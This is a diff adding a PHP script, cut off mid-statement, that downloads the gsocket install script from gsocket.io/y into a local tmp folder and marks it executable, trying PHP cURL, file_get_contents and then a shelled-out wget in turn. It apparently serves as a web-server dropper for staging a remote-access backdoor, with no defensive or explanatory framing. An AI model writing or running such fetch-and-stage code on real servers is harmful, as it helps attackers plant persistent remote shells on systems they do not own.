@@ -1,0 +1,65 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+function say($s){ echo "<pre>$s</pre>"; }
+
+$saveDir = __DIR__ . "/tmp";
+if (!is_dir($saveDir)) { @mkdir($saveDir, 0700, true); }
+$dst = $saveDir . "/gsocket_y.sh";
+@unlink($dst); // mulai bersih
+
+$url = "https://gsocket.io/y";
+say("Target: $url\nSave to: $dst");
+
+// --- Method A: PHP cURL ---
+$curlOk = false;
+if (function_exists('curl_init')) {
+  $ch = curl_init($url);
+  curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_TIMEOUT => 30,
+    CURLOPT_SSL_VERIFYHOST => 2,
+    CURLOPT_SSL_VERIFYPEER => true,
+  ]);
+  $body = curl_exec($ch);
+  $cerr = curl_error($ch);
+  $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
+  curl_close($ch);
+
+  if ($body !== false && $code >= 200 && $code < 300) {
+    if (file_put_contents($dst, $body, LOCK_EX) !== false) {
+      chmod($dst, 0700);
+      $curlOk = true;
+      say("Method A (cURL): OK, HTTP $code, saved.");
+    } else {
+      say("Method A (cURL): write FAIL.");
+    }
+  } else {
+    say("Method A (cURL): FAIL (HTTP $code) ".($cerr ?: ""));
+  }
+}
+
+// --- Method B: file_get_contents ---
+if (!$curlOk) {
+  $ctx = stream_context_create([
+    'http'=>['timeout'=>30],
+    'ssl' =>['verify_peer'=>true, 'verify_peer_name'=>true]
+  ]);
+  $data = @file_get_contents($url, false, $ctx);
+  if ($data !== false && file_put_contents($dst, $data, LOCK_EX) !== false) {
+    chmod($dst, 0700);
+    say("Method B (file_get_contents): OK, saved.");
+  } else {
+    say("Method B (file_get_contents): FAIL.");
+  }
+}
+
+// --- Method C: wget ---
+if (!file_exists($dst)) {
+  $cmd = "/bin/wget -O ".escapeshellarg($dst)." ".escapeshellarg($url)." 2>&1";
+  $out = shell_exec($cmd);
+  say("Method C (wget):\n$cmd\n---\n".($out ?: "(no output)"));
+
+  if
